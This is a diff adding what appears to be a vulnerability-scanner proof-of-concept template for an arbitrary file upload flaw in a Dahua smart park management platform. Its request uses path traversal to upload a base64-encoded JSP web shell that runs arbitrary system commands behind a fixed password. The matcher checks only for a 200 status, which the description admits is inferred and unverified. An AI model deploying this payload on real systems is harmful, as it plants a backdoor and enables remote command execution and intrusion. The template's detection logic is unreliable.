@@ -1,0 +1,20 @@
+id: poc-5907955785
+info:
+  name: 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞_glgp6b2wzhcuivsz
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+http:
+- raw:
+  - "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\n    <soapenv:Header/>\n\t    <soapenv:Body>\n     \t\t    <res:uploadPicFile>\n                    <arg0>\n             \t    <picPath>/../rce.jsp</picPath>\n                    </arg0>\n                    <arg1>PCUgaWYoIjEyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpeyBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07IG91dC5wcmludCgiPHByZT4iKTsgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7IH0gb3V0LnByaW50KCI8L3ByZT4iKTsgfSAlPg==</arg1>\n                </res:uploadPicFile>\n\t\t</soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
